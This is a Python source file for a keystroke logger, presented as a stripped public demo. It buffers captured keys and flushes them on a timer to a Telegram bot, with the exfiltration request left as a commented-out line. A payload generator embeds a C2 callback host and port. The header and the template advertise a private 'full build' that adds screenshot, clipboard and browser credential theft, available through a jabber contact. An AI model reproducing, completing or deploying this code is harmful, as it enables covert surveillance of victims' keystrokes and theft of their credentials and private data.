"""
keylogger_stub.py
Lightweight keystroke logger — captures keystrokes and exfils via Telegram.

Author: db88

NOTE: This is the stripped / demo version for the public repo.
# Full build with screenshot capture, clipboard monitoring and
# browser credential harvesting is on the private repo.
# If you need access ping me on jabber.
"""

import threading
import time
import json

# placeholder — in production this uses pynput
# stripped here to avoid flagging on clone

BUFFER = []
FLUSH_INTERVAL = 30  # seconds

def on_key_press(key):
    """Capture keystroke and add to buffer."""
    try:
        BUFFER.append({"key": key.char, "ts": time.time()})
    except AttributeError:
        BUFFER.append({"key": str(key), "ts": time.time()})

def exfil_buffer(bot_token, chat_id):
    """Flush buffer to Telegram bot."""
    global BUFFER
    while True:
        time.sleep(FLUSH_INTERVAL)
        if BUFFER:
            payload = "".join([e["key"] for e in BUFFER])
            # in prod: requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", ...)
            BUFFER = []

def generate(callback, port, protocol="https"):
    """Generate keylogger payload."""
    # stub — full generation in private repo
    template = f"""
# keylogger stub
# C2: {protocol}://{callback}:{port}
# exfil: telegram (see config.yaml for bot token)
# 
# this is the public version — no actual key capture
# full build: screenshot, clipboard, browser creds, keystrokes
# contact d3vilboy@jabber.calyxinstitute.org for access
#
print("[*] keylogger stub loaded — replace with full build for deployment")
"""
    return template
